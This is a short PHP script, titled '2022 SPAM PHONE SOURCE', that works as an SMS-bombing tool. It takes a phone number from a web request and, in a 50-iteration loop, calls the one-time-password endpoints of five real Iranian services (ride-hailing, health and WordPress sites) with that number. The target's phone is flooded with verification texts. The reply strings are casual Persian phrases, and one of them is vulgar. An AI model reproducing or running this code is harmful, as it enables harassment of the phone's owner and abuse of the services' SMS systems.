<?php

// be nam GOD
// 2022 SPAM PHONE SOURCE

if (isset($_GET['phone'])){
      if($_GET['sms']){
            $otp = 'send';
            $phone = $_GET['phone'];
            otp_spam("$otp", "$phone");
            $okn = [
                  "phone"=>"{$phone}",
                  "send"=>"yes"
            ];
            $ry = json_encode($okn);
            echo $ry;
      } else {
            echo "eror";
      }
} else {
      echo "eror";
}


function otp_spam($otp, $phone)
{
for ($i=0; $i < 50; $i++) { 
file_get_contents("https://join.tapsi.ir/smsConfirm?phoneNumber={$phone}");
file_get_contents("https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={$phone}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=");
file_get_contents("https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{$phone}/sms?cCode=+98");
file_get_contents("https://nazarkade.com/wp-admin/admin-ajax.php?action=digits_resendotp&countrycode=%2B98&mobileNo={$phone}&csrf=e4ee6a06f4&login=2&whatsapp=0");
file_get_contents("https://p4game.ir/wp-admin/admin-ajax.php?action=digits_check_mob&countrycode=%2B98&mobileNo={$phone}&csrf=639c6ecca3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%85%D8%AD%D9%85%D8%AF&digregcode=%2B98&digits_reg_mail={$phone}&dig_otp=&code=&dig_reg_mail=&dig_nounce=639c6ecca3");
      }
      switch ($phone) {
            case "$phone":
                  $rti = [
                        'انجام شد عشقم (:',
                        'انجام شد عامو (:',
                        'داپش انجام شد (:',
                        'کیر خر - انجام شد (:',
                        'اوکی انجام شد (:'
                  ];
                  $sdf = $rti[array_rand($rti)];
                  echo "$sdf";
                  break;
            
            default:
            echo "eror server";
                  break;
      }
}


?>